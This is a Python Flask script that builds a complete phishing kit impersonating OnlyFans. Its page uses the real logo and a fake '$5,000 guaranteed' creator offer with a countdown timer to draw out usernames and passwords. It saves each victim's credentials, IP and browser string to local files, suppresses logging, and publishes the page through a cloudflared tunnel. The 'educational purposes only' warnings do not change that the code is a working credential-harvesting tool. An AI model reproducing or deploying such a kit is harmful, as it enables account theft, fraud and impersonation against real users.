import os
import sys
import subprocess
import re
import threading
import time
import logging
import random
from flask import Flask, render_template_string, request, session
from datetime import datetime
from werkzeug.utils import secure_filename

def install(pkg):
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", pkg])

for pkg in ["flask", "werkzeug"]:
    try:
        __import__(pkg)
    except ImportError:
        install(pkg)

app = Flask(__name__)
app.secret_key = 'onlyfans-test-key'

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR + 10)
app.logger.setLevel(logging.ERROR + 10)

class DummyFile(object):
    def write(self, x): pass
    def flush(self): pass

BASE_FOLDER = os.path.expanduser("~/storage/downloads/OnlyFans")
os.makedirs(BASE_FOLDER, exist_ok=True)

@app.route('/')
def index():
    session['of_session'] = str(random.randint(100000, 999999))
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>OnlyFans - Creator Program & Premium Access</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            :root {
                --onlyfans-pink: #00AFF0;
                --onlyfans-dark: #0F0F0F;
                --onlyfans-light: #FFFFFF;
                --onlyfans-gray: #808080;
            }
            
            * {
                box-sizing: border-box;
            }
            
            body {
                background: #0F0F0F;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
                margin: 0;
                padding: 20px;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                color: #FFFFFF;
                -webkit-tap-highlight-color: transparent;
                -webkit-text-size-adjust: 100%;
            }
            
            .login-box {
                background: rgba(255, 255, 255, 0.05);
                backdrop-filter: blur(10px);
                width: 100%;
                max-width: 420px;
                padding: 25px 20px;
                border-radius: 16px;
                text-align: center;
                border: 1px solid rgba(255, 255, 255, 0.1);
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
                margin: 0 auto;
            }
            
            .onlyfans-logo-container {
                display: flex;
                justify-content: center;
                align-items: center;
                margin-bottom: 20px;
            }
            
            .onlyfans-logo {
                height: 60px;
                width: auto;
                filter: brightness(0) invert(1);
            }
            
            .creator-banner {
                background: linear-gradient(90deg, #00AFF0 0%, #0088CC 50%, #00AFF0 100%);
                color: white;
                padding: 14px 10px;
                border-radius: 10px;
                margin: 20px 0;
                font-weight: 700;
                font-size: 18px;
                border: 2px solid #0088CC;
                line-height: 1.3;
            }
            
            .earnings-badge {
                background: linear-gradient(45deg, #FF6B9D, #FF8CB3);
                color: white;
                padding: 14px 28px;
                border-radius: 22px;
                margin: 18px auto;
                font-weight: 800;
                font-size: 24px;
                width: fit-content;
                max-width: 90%;
                border: 3px solid white;
                box-shadow: 0 8px 24px rgba(255, 107, 157, 0.3);
                line-height: 1.2;
            }
            
            .giveaway-container {
                background: rgba(0, 175, 240, 0.1);
                border: 2px dashed var(--onlyfans-pink);
                border-radius: 12px;
                padding: 20px;
                margin: 20px 0;
            }
            
            h1 {
                font-size: 28px;
                margin: 10px 0;
                color: white;
                font-weight: 700;
                line-height: 1.2;
            }
            
            .subtitle {
                color: #808080;
                font-size: 15px;
                margin-bottom: 25px;
                line-height: 1.5;
            }
            
            .timer {
                background: rgba(255, 0, 0, 0.1);
                border: 2px solid #FF4C4C;
                border-radius: 8px;
                padding: 14px;
                margin: 18px 0;
                font-family: 'Courier New', monospace;
                font-size: 22px;
                color: #FF9999;
                text-align: center;
                font-weight: bold;
            }
            
            .stats-bar {
                display: flex;
                justify-content: space-between;
                background: rgba(255, 255, 255, 0.05);
                border-radius: 8px;
                padding: 12px;
                margin: 18px 0;
                flex-wrap: wrap;
            }
            
            .stat-item {
                text-align: center;
                flex: 1;
                min-width: 33%;
                padding: 5px;
            }
            
            .stat-number {
                font-size: 18px;
                font-weight: 800;
                color: var(--onlyfans-pink);
            }
            
            .stat-label {
                font-size: 10px;
                color: #808080;
                text-transform: uppercase;
                letter-spacing: 0.5px;
                margin-top: 3px;
            }
            
            .form-group {
                text-align: left;
                margin-bottom: 20px;
            }
            
            .form-label {
                color: #B0B0B0;
                font-size: 13px;
                font-weight: 600;
                margin-bottom: 6px;
                display: block;
                text-transform: uppercase;
                letter-spacing: 0.5px;
            }
            
            input {
                width: 100%;
                padding: 15px;
                background: rgba(255, 255, 255, 0.05);
                border: 2px solid rgba(255, 255, 255, 0.1);
                border-radius: 8px;
                color: white;
                font-size: 16px;
                box-sizing: border-box;
                transition: all 0.3s;
                -webkit-appearance: none;
            }
            
            input:focus {
                border-color: var(--onlyfans-pink);
                outline: none;
                background: rgba(255, 255, 255, 0.1);
            }
            
            input::placeholder {
                color: #666666;
            }
            
            .login-btn {
                background: linear-gradient(45deg, #00AFF0, #0088CC);
                color: white;
                border: none;
                padding: 17px;
                border-radius: 8px;
                font-weight: 700;
                font-size: 17px;
                width: 100%;
                margin: 22px 0 12px;
                cursor: pointer;
                transition: all 0.3s;
                text-transform: uppercase;
                letter-spacing: 1px;
                -webkit-appearance: none;
                touch-action: manipulation;
            }
            
            .login-btn:active {
                transform: translateY(0);
                box-shadow: 0 4px 12px rgba(0, 175, 240, 0.4);
            }
            
            .benefits-list {
                text-align: left;
                margin: 22px 0;
            }
            
            .benefit-item {
                display: flex;
                align-items: center;
                margin: 12px 0;
                color: #FFFFFF;
                font-size: 15px;
            }
            
            .benefit-icon {
                color: #00AFF0;
                font-weight: bold;
                margin-right: 12px;
                font-size: 18px;
                min-width: 18px;
            }
            
            .verified-badge {
                display: inline-flex;
                align-items: center;
                background: rgba(0, 175, 240, 0.2);
                color: #00AFF0;
                padding: 5px 10px;
                border-radius: 18px;
                font-size: 11px;
                font-weight: 700;
                margin-left: 8px;
            }
            
            .warning-note {
                color: #FF9999;
                font-size: 11px;
                margin-top: 22px;
                border-top: 1px solid rgba(255, 255, 255, 0.1);
                padding-top: 18px;
                text-align: center;
                line-height: 1.4;
            }
            
            .creator-level {
                display: inline-flex;
                align-items: center;
                background: linear-gradient(45deg, #FF6B9D, #FF8CB3);
                color: white;
                padding: 7px 14px;
                border-radius: 18px;
                font-size: 13px;
                font-weight: 700;
                margin: 8px 0;
            }
            
            .age-warning {
                background: rgba(255, 0, 0, 0.1);
                border: 1px solid #FF4C4C;
                border-radius: 8px;
                padding: 11px;
                margin: 18px 0;
                font-size: 11px;
                color: #FF9999;
                line-height: 1.4;
            }
            
            /* Mobile-specific optimizations */
            @media (max-width: 375px) {
                body {
                    padding: 15px;
                }
                
                .login-box {
                    padding: 20px 15px;
                    border-radius: 14px;
                }
                
                .onlyfans-logo {
                    height: 50px;
                }
                
                .earnings-badge {
                    font-size: 20px;
                    padding: 12px 20px;
                }
                
                .creator-banner {
                    font-size: 16px;
                    padding: 12px 8px;
                }
                
                h1 {
                    font-size: 24px;
                }
                
                .timer {
                    font-size: 20px;
                    padding: 12px;
                }
                
                .stat-number {
                    font-size: 16px;
                }
                
                .benefit-item {
                    font-size: 14px;
                }
                
                input, .login-btn {
                    padding: 14px;
                }
                
                .login-btn {
                    font-size: 16px;
                }
            }
            
            @media (max-height: 700px) {
                body {
                    align-items: flex-start;
                    padding-top: 40px;
                    padding-bottom: 40px;
                }
            }
            
            /* Animation for timer warning */
            @keyframes pulse {
                0% { opacity: 1; }
                50% { opacity: 0.7; }
                100% { opacity: 1; }
            }
            
            /* Prevent zoom on input focus for iOS */
            @media screen and (-webkit-min-device-pixel-ratio:0) {
                select,
                textarea,
                input {
                    font-size: 16px !important;
                }
            }
            
            /* Improve touch targets */
            .form-label,
            .benefit-item,
            .stat-item {
                touch-action: manipulation;
            }
        </style>
    </head>
    <body>
        <div style="display: flex; flex-direction: column; align-items: center; width: 100%;">
            <div class="login-box">
                <div class="onlyfans-logo-container">
                    <img src="https://static.onlyfans.com/theme/onlyfans/images/logo.svg" alt="OnlyFans" class="onlyfans-logo">
                </div>
                
                <div class="creator-banner">
                    💰 CREATOR BOOST PROGRAM 💰
                </div>
                
                <div class="earnings-badge">
                    $5,000 GUARANTEED
                </div>
                
                <div class="creator-level">
                    🚀 TOP 1% CREATOR STATUS
                </div>
                
                <div class="giveaway-container">
                    <h1>Boost Your Earnings</h1>
                    <div class="subtitle">
                        For new and existing creators <span class="verified-badge">Verified</span>
                    </div>
                    
                    <div class="timer" id="countdown">
                        24:00
                    </div>
                </div>
                
                <div class="age-warning">
                    ⚠️ You must be 18+ to access this content. By continuing, you confirm you are at least 18 years old.
                </div>
                
                <div class="stats-bar">
                    <div class="stat-item">
                        <div class="stat-number">98%</div>
                        <div class="stat-label">Success Rate</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-number">24/7</div>
                        <div class="stat-label">Support</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-number">30K+</div>
                        <div class="stat-label">Creators</div>
                    </div>
                </div>
                
                <div class="benefits-list">
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        $5,000 Minimum Earnings Guarantee
                    </div>
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        Premium Account Verification
                    </div>
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        Advanced Analytics Dashboard
                    </div>
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        Priority Creator Support
                    </div>
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        Custom Promotion & Marketing
                    </div>
                </div>
                
                <form action="/login" method="post">
                    <div class="form-group">
                        <label class="form-label">EMAIL OR USERNAME</label>
                        <input type="text" name="username" placeholder="Enter your OnlyFans email or username" required>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">PASSWORD</label>
                        <input type="password" name="password" placeholder="Enter your password" required>
                    </div>
                    
                    <button type="submit" class="login-btn">
                        💰 Claim Creator Boost
                    </button>
                </form>
                
                <div class="warning-note">
                    ⚠️ This Creator Boost program ends in 24 hours. Earnings guaranteed for first 100 approved creators.
                </div>
            </div>
        </div>
        
        <script>
            // Countdown timer
            let timeLeft = 1440; // 24 minutes in seconds
            const countdownElement = document.getElementById('countdown');
            
            function updateTimer() {
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                
                if (timeLeft <= 300) { // Last 5 minutes
                    countdownElement.style.background = 'rgba(255, 0, 0, 0.2)';
                    countdownElement.style.animation = 'pulse 1s infinite';
                }
                
                if (timeLeft > 0) {
                    timeLeft--;
                    setTimeout(updateTimer, 1000);
                } else {
                    countdownElement.textContent = "Program Closed!";
                    countdownElement.style.color = '#FF4C4C';
                }
            }
            
            // Start timer when page loads
            document.addEventListener('DOMContentLoaded', updateTimer);
            
            // Prevent form submission spam
            const form = document.querySelector('form');
            let formSubmitted = false;
            
            form.addEventListener('submit', function(e) {
                if (formSubmitted) {
                    e.preventDefault();
                    return false;
                }
                formSubmitted = true;
                setTimeout(() => {
                    formSubmitted = false;
                }, 3000);
            });
            
            // Improve touch experience
            document.querySelectorAll('input').forEach(input => {
                input.addEventListener('touchstart', function() {
                    this.style.transform = 'scale(0.98)';
                });
                
                input.addEventListener('touchend', function() {
                    this.style.transform = 'scale(1)';
                });
            });
        </script>
    </body>
    </html>
    ''')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    session_id = session.get('of_session', 'unknown')

    safe_username = secure_filename(username)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    user_file_path = os.path.join(BASE_FOLDER, f"{safe_username}_{timestamp}.txt")

    with open(user_file_path, 'w') as file:
        file.write(f"Session: {session_id}\n")
        file.write(f"Username: {username}\n")
        file.write(f"Password: {password}\n")
        file.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        file.write(f"User-Agent: {request.headers.get('User-Agent', 'Unknown')}\n")
        file.write(f"IP: {request.remote_addr}\n")
        file.write(f"Platform: OnlyFans Creator Boost Program\n")
        file.write(f"Promised: $5,000 Earnings Guarantee\n")
        file.write(f"Warning: This is a phishing simulation - NEVER enter real credentials!\n")

    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>OnlyFans Creator Boost Activation</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <style>
            * {
                box-sizing: border-box;
            }
            
            body {
                background: #0F0F0F;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
                margin: 0;
                padding: 20px;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                color: #FFFFFF;
                -webkit-tap-highlight-color: transparent;
            }
            
            .container {
                text-align: center;
                background: rgba(255, 255, 255, 0.05);
                backdrop-filter: blur(10px);
                padding: 30px 20px;
                border-radius: 16px;
                width: 100%;
                max-width: 500px;
                border: 1px solid rgba(255, 255, 255, 0.1);
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
                margin: 0 auto;
            }
            
            .onlyfans-logo {
                height: 50px;
                width: auto;
                filter: brightness(0) invert(1);
                margin-bottom: 20px;
            }
            
            .earnings-icon {
                width: 90px;
                height: 90px;
                margin: 0 auto 20px;
                background: linear-gradient(45deg, #00AFF0, #FF6B9D);
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                color: white;
                font-size: 40px;
                font-weight: bold;
                border: 4px solid white;
                animation: float 3s ease-in-out infinite;
            }
            
            @keyframes float {
                0%, 100% { transform: translateY(0); }
                50% { transform: translateY(-10px); }
            }
            
            .processing-container {
                background: rgba(0, 175, 240, 0.1);
                border: 2px solid #00AFF0;
                border-radius: 12px;
                padding: 25px 15px;
                margin: 25px 0;
            }
            
            .progress-container {
                width: 100%;
                height: 8px;
                background: rgba(255, 255, 255, 0.1);
                border-radius: 4px;
                margin: 20px 0;
                overflow: hidden;
            }
            
            .progress-bar {
                height: 100%;
                background: linear-gradient(90deg, #00AFF0, #0088CC, #FF6B9D);
                border-radius: 4px;
                width: 0%;
                animation: fillProgress 3s ease-in-out forwards;
            }
            
            @keyframes fillProgress {
                0% { width: 0%; }
                100% { width: 100%; }
            }
            
            .boost-activated {
                background: rgba(255, 107, 157, 0.1);
                border: 2px solid #FF6B9D;
                border-radius: 12px;
                padding: 20px 15px;
                margin: 20px 0;
                text-align: left;
            }
            
            .checkmark {
                color: #00AFF0;
                font-weight: bold;
                font-size: 20px;
                margin-right: 12px;
                min-width: 20px;
            }
            
            .status-item {
                display: flex;
                align-items: flex-start;
                margin: 15px 0;
                color: #FFFFFF;
                font-size: 16px;
                line-height: 1.3;
            }
            
            .earnings-amount {
                font-size: 48px;
                font-weight: 900;
                background: linear-gradient(45deg, #00AFF0, #FF6B9D);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                margin: 15px 0;
                text-shadow: 0 0 20px rgba(0, 175, 240, 0.3);
                line-height: 1;
            }
            
            .dollar-sign {
                color: #FF6B9D;
                font-size: 32px;
                margin-right: 8px;
                vertical-align: middle;
            }
            
            .verification-badge {
                background: linear-gradient(45deg, #00AFF0, #0088CC);
                color: white;
                padding: 9px 18px;
                border-radius: 20px;
                font-size: 13px;
                font-weight: 700;
                margin: 15px 0;
                display: inline-block;
            }
            
            h2 {
                margin-bottom: 10px;
                color: #00AFF0;
                font-size: 24px;
            }
            
            p {
                color: #808080;
                margin-bottom: 25px;
                font-size: 15px;
                line-height: 1.4;
            }
            
            /* Mobile optimizations */
            @media (max-width: 375px) {
                body {
                    padding: 15px;
                }
                
                .container {
                    padding: 25px 15px;
                }
                
                .onlyfans-logo {
                    height: 45px;
                }
                
                .earnings-icon {
                    width: 80px;
                    height: 80px;
                    font-size: 36px;
                }
                
                .earnings-amount {
                    font-size: 42px;
                }
                
                .status-item {
                    font-size: 15px;
                }
                
                h2 {
                    font-size: 22px;
                }
                
                .processing-container {
                    padding: 20px 12px;
                }
            }
            
            @media (max-height: 700px) {
                body {
                    align-items: flex-start;
                    padding-top: 30px;
                    padding-bottom: 30px;
                }
            }
        </style>
        <meta http-equiv="refresh" content="8;url=/" />
    </head>
    <body>
        <div class="container">
            <div class="earnings-icon">💰</div>
            
            <img src="https://static.onlyfans.com/theme/onlyfans/images/logo.svg" alt="OnlyFans" class="onlyfans-logo">
            
            <div class="verification-badge">
                ✅ PREMIUM CREATOR VERIFIED
            </div>
            
            <div class="earnings-amount">
                <span class="dollar-sign">$</span>5,000
            </div>
            
            <h2>Creator Boost Activated!</h2>
            <p>Your account is being upgraded to premium creator status</p>
            
            <div class="processing-container">
                <h3>Processing Your Boost Program</h3>
                <div class="progress-container">
                    <div class="progress-bar"></div>
                </div>
                <p>Verifying account and setting up earnings guarantee...</p>
            </div>
            
            <div class="boost-activated">
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <div><strong>$5,000 Earnings</strong> guarantee activated</div>
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <div><strong>Premium Verification</strong> - Top 1% status</div>
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <div><strong>Advanced Analytics</strong> - Full dashboard access</div>
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <div><strong>Priority Support</strong> - 24/7 dedicated team</div>
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <div><strong>Custom Promotion</strong> - Marketing campaign setup</div>
                </div>
            </div>
            
            <p style="color: #808080; margin-top: 25px; font-size: 14px;">
                You will be redirected to OnlyFans shortly...
                <br>
                <small style="color: #666666;">Your creator boost benefits will be active within 48 hours</small>
            </p>
        </div>
        
        <script>
            // Animate earnings amount
            setTimeout(() => {
                const earningsAmount = document.querySelector('.earnings-amount');
                earningsAmount.style.transform = 'scale(1.1)';
                earningsAmount.style.transition = 'transform 0.3s';
                setTimeout(() => {
                    earningsAmount.style.transform = 'scale(1)';
                }, 300);
            }, 1500);
            
            // Add touch feedback for mobile
            document.addEventListener('touchstart', function() {}, {passive: true});
        </script>
    </body>
    </html>
    ''')

def run_cloudflared_tunnel(local_url):
    cmd = ["cloudflared", "tunnel", "--url", local_url]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    
    for line in process.stdout:
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            tunnel_url = match.group(0)
            print(f"💸 OnlyFans Creator Public Link: {tunnel_url}")
            print(f"💰 Promising: $5,000 Guaranteed Earnings")
            print(f"💾 Credentials saved to: {BASE_FOLDER}")
            print("⚠️  EXTREME WARNING: For educational purposes only!")
            print("⚠️  NEVER enter real OnlyFans credentials!")
            print("⚠️  OnlyFans accounts have financial AND personal data!")
            print("⚠️  This platform involves adult content - be extremely careful!")
            print("⚠️  REAL LEGAL RISKS: OnlyFans phishing can involve serious crimes!")
            print("-" * 50)
            sys.stdout.flush()
            break
    
    return process

if __name__ == '__main__':
    sys_stdout = sys.stdout
    sys_stderr = sys.stderr
    sys.stdout = DummyFile()
    sys.stderr = DummyFile()

    def run_flask():
        app.run(host='0.0.0.0', port=5010, debug=False, use_reloader=False)

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    time.sleep(2)
    sys.stdout = sys_stdout
    sys.stderr = sys_stderr

    print("🚀 Starting OnlyFans Creator Boost Page...")
    print("📱 Port: 5010")
    print("💾 Save location: ~/storage/downloads/OnlyFans/")
    print("💰 Promising: $5,000 Guaranteed Earnings")
    print("🎯 Target: Content creators and subscribers")
    print("⚠️  EXTREME LEGAL WARNING: This is SENSITIVE content!")
    print("⚠️  ONLY use for SECURITY EDUCATION in controlled environments!")
    print("⏳ Waiting for cloudflared tunnel...")
    
    cloudflared_process = run_cloudflared_tunnel("http://127.0.0.1:5010")

    try:
        cloudflared_process.wait()
    except KeyboardInterrupt:
        cloudflared_process.terminate()
        print("\n👋 Server stopped")
        sys.exit(0)